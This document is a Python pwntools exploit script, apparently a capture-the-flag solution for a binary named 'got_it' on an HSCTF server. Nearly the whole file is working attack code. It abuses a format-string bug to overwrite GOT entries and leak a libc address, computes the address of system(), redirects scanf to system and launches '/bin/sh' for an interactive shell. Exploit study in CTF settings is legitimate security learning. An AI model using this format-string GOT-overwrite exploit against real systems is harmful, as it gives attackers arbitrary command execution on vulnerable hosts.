from pwn import *

file = "./got_it"

context.binary = file
context.log_level = 'debug'

bin = ELF(file)
r = process(file)
raw_input()
#r = remote("pwn.hsctf.com", 5004)

# libc6_2.27-3ubuntu1_amd64

fgetsGOT = bin.got["fgets"]
exitGOT = bin.got["exit"]
setvbufGOT = bin.got["setvbuf"]
scanfGOT = bin.got["__isoc99_scanf"]
setupReturnAddr = 0x004012f7

# override exit function to jump to main and give us a second read/write
# also override setvbuf to jump directly to the end of the setup function
# since allowing to this function to run would mess up the got table
# in the same run we need to leak a libc addr through the got in order
# to calculate the libc base
payload = ("%"+str(setupReturnAddr)+"x%34$lln  %36$lln"+"START%37$s"+"END").ljust(208)
payload += pack(setvbufGOT)
payload += pack(exitGOT)
payload += pack(exitGOT)
payload += pack(fgetsGOT)

r.sendlineafter("Give me sumpfink to help me out", payload)
r.recvuntil("START", timeout=7)

fgetsGOTAddr = unpack(r.recvuntil("END", drop=True, timeout=7)+"\x00\x00")

# receive the fgets got addr that is printed out by the %37$s format
# substract the offset from fgets to gets it's libc base
libcBaseAddr = fgetsGOTAddr - 0x07eb20

print "[*] fgetsAddr 0x%x" % fgetsGOTAddr
print "[*] libcBaseAddr 0x%x" % libcBaseAddr

# system (libcBase + systemOffset)
systemAddr = libcBaseAddr + 0x04f440

print "[*] systemAddr 0x%x" % systemAddr
print "[*] exitGOTAddr 0x%x" % exitGOT

# split the gadget address since writing
# hugh numbers with printf is way to long
# so we write the address in 2 x 4
systemAddrMiddle = (systemAddr & 0xFFFF0000) >> 16
systemAddrRight = (systemAddr & 0xFFFF)

# ensure that the first int is smaller than the last one
# since if the first addr we write is bigger than the second
# the printed chars by printf would exceed the int we need to write
assert(systemAddrMiddle < systemAddrRight, "invalid addr to write with printf")

payload = ("%"+str(systemAddrMiddle)+"x%36$hn"+"%"+str(systemAddrRight - systemAddrMiddle)+"x%37$hn").ljust(216)
payload += pack(scanfGOT)
payload += pack(scanfGOT + 2)
payload += pack(scanfGOT)

# we swap the scanf function with system
# since the next function call will scanf(userinput)
r.sendlineafter("Give me sumpfink to help me out", payload)

# calling system("/bin/sh")
r.sendlineafter("Give me sumpfink to help me out", "/bin/sh")
r.interactive()